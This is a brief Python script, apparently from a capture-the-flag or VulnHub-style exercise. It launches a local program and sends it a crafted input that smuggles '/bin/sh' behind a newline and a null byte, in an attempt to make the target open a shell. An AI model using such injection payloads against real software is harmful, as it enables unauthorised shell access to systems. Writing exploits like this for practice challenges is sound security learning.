import subprocess

# Start the program as a subprocess
process = subprocess.Popen(['python3', './main.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

commit='vulnhub\n+/bin/sh\x00'.encode()
output, _ = process.communicate(input=commit)

print(output.decode())